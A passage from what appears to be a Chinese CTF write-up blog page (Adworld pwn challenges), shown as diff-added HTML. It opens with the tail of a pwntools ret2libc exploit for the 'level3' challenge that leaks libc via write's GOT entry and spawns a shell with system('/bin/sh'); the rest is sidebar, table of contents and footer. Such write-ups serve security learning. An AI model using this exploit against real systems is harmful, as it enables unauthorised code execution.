class="string">"level3"</span>)</span><br><span class="line"></span><br><span class="line">vul_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8C</span> + p32(write_plt) + p32(vul_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendafter(<span class="string">"put:\n"</span>, payload)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">"write_addr: "</span> + str(hex(write_addr)))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8C</span> + p32(system_addr) + p32(<span class="number">1</span>) + p32(bin_sh_addr)</span><br><span class="line">r.sendafter(<span class="string">"put:\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/blog/tags/攻防世界/" rel="tag"># 攻防世界</a>
+          
+            <a href="/blog/tags/Adworld/" rel="tag"># Adworld</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2020/03/05/BugkuCTF-WriteUp/" rel="next" title="BugkuCTF-WriteUp">
+                <i class="fa fa-chevron-left"></i> BugkuCTF-WriteUp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://q1.qlogo.cn/g?b=qq&nk=948375961&s=640" alt="SNCKER">
+            
+              <p class="site-author-name" itemprop="name">SNCKER</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/blog/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/blog/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">1.1.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#guess-num"><span class="nav-number">1.2.</span> <span class="nav-text">guess_num</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#int-overflow"><span class="nav-number">1.3.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgpwn2"><span class="nav-number">1.4.</span> <span class="nav-text">cgpwn2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#when-did-you-born"><span class="nav-number">1.5.</span> <span class="nav-text">when_did_you_born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-pwn"><span class="nav-number">1.6.</span> <span class="nav-text">hello_pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-number">1.7.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">1.8.</span> <span class="nav-text">level3</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SNCKER</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/blog/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/blog/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/blog/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/blog/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/blog/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/blog/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/blog/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/blog/js/love.js"></script>
+</body>
+</html>
